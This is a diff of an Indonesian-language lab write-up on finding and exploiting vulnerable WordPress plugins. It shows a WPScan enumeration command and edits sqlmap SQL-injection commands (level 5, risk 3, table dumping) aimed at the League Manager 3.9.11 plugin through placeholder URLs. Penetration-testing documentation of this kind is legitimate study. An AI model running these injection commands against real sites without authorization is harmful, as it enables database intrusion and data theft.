@@ -74,7 +74,7 @@ http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
 - Buka terminal pada folder dimana wpscan berada, jalankan perintah:<pre>
 ruby wpscan.rb --url alamat_site  --enumerate vp
 </pre>
-       Parameter  `vp`  pada  `--enumerate`  untuk memunculkan hasil plugin yang vulnerable.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Parameter  `vp`  pada  `--enumerate`  untuk memunculkan hasil plugin yang vulnerable.
 
 - Hasil dari WPScan:
 
@@ -113,8 +113,11 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 
 #### Plugin - League Manager 3.9.11
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
-</pre>
+python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
+</pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+- atau::<pre>
+python sqlmap.py --url "http://alamat_post_mengandung_plugin?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
+</pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
 ## Kesimpulan dan Saran
 
